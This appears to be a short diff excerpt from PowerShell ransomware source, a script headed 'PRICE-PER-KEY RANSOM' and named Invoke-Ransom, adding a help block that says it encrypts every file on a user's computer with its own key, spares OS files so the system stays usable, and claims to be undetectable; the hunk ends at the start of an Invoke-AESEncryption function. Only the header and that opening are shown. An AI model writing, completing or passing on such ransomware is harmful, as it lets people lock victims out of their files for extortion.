@@ -3,6 +3,25 @@
 ####   PRICE-PER-KEY RANSOM  ####
 #################################  
 
+<#
+.Synopsis
+    This script will encrypt every file with its own encryption key on a users computer based on that 
+    users permissions. If run by System then some main System files will be encrypted also. Important 
+    files will not be touch so OS can still function. Will NOT run on Powershell 5.
+ 
+.NOTES
+    Name: Invoke-Ransom
+    Author: Elder4Ever
+    Version: 1.0
+    DateCreated: 2022-08-30
+    Detection: Undetectable (as of 2022-08-30)
+    Powershell Version: 7.0 or Higher
+ 
+.LINK
+    No Link Yet
+    
+#>
+
 function Invoke-AESEncryption {
     [CmdletBinding()]
     [OutputType([string])]
